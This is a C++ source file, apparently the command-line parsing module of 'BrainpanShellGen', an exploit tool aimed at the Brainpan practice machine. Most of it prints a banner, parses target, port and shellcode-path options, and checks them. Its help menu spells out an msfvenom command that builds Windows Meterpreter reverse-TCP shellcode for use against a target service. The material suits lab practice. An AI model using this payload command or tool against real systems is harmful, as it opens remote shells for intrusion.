#include "../headers/arguments.h"
#include "../headers/options.h"

void InitProgram::PrintBanner(){
std::string Banner = ""                               
    "  ____            _                                    \n"
    " | __ ) _ __ __ _(_)_ __  _ __   __ _ _ __              \n"
    " |  _ \\| '__/ _` | | '_ \\| '_ \\ / _` | '_ \\             \n"
    " | |_) | | | (_| | | | | | |_) | (_| | | | |            \n"
    " |____/|_|  \\__,_|_|_| |_| .__/ \\__,_|_|_|_|            \n"
    "                / ___|| ||_|  ___| | |/ ___| ___ _ __   \n"
    "                \\___ \\| '_ \\ / _ \\ | | |  _ / _ \\ '_ \\  \n"
    "                 ___) | | | |  __/ | | |_| |  __/ | | | \n"
    "                |____/|_| |_|\\___|_|_|\\____|\\___|_| |_| \n"
    "                                ~ Gremlin the Greenest      \n";
    std::cout << Banner << std::endl;
    return;
}

void InitProgram::PrintHelpMenu(){
    PrintBanner();
    std::string helpMenu = R"(USAGE : BrainpanShellGen.exe <-t TARGET> <-p TARGET_PORT> <-o OUTPUT_FILENAME>
    -h OR -? Prints this help menu
    -t <TARGET_HOST> IP Address or Hostname (Local or from DNS) to exploit
    -p <TARGET_PORT> Port where the service run on the target. default:'9999'
    -s <SHELLCODE_PATH> Path to your generated shellcode

Generate Shellcode : msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOURLISTENIP LPORT=YOURLISTENPORT -f c -b \x00\x0a\x0d\xff
Put that shell code as a one liner in a file and give that file as an argument

EXAMPLES : .\BrainpanShellGen.exe -t 127.0.0.1 -p 9999
           .\BrainpanShellGen.exe -t target.com -p 9999 -o payload.exe
    )";
    std::cout << helpMenu << std::endl;
    exit(1);

}

InitArguments InitProgram::GetArguments(int argc, char* argv[]){
    InitArguments args;
    int ParsedArg = 0;
    PrintStatus("PARSING OPTIONS\t", "IN-PROGRESS");
    while((ParsedArg = getopt(argc, argv, "t:s:o:p:h?")) != EOF){
        switch(ParsedArg){
            case 't':
                args.TARGET_HOST = optarg;
                PrintStatus("TARGET HOST\t", optarg);
                break;
            
            case 'o':
                args.OUTPUT_FILENAME = optarg;
                PrintStatus("OUTPUT FILENAME\t", optarg);
                break;

            case 'p':
                args.TARGET_PORT = optarg;
                PrintStatus("TARGET PORT\t", optarg);
                break;

            case 's':
                args.SHELLCODE_PATH = optarg;
                PrintStatus("SHELLCODE PATH\t", optarg);
                break;
            case 'h': 
                PrintHelpMenu();
                break;
            case '?': 
                PrintHelpMenu();
                break;
        }
    }

    PrintStatus("CHECKING OPTION\t", "IN-PROGRESS");
    if(args.TARGET_HOST.length() == 0){
        PrintStatus("CHECKING OPTION\t", "FAILED");
        std::cout << "\nPLEASE CHECK YOUR TARGET_HOST. USE -h or -? SWITCH TO PRINT HELP MENU" << std::endl;
        exit(1);
    }

    if(args.TARGET_PORT.length() == 0){
        PrintStatus("CHECKING OPTION\t", "FAILED");
        std::cout << "\nPLEASE CHECK YOUR TARGET_PORT. USE -h or -? SWITCH TO PRINT HELP MENU" << std::endl;
        exit(1);
    }

    if(args.SHELLCODE_PATH.length() == 0){
        PrintStatus("CHECKING OPTION\t", "FAILED");
        std::cout << "\nPLEASE CHECK YOUR SHELLCODE_PATH. USE -h or -? SWITCH TO PRINT HELP MENU" << std::endl;
        exit(1);
    }

    PrintStatus("PARSING OPTIONS\t", "DONE");
    PrintStatus("CHECKING OPTION\t", "SUCCEEDED");
    return args;
}
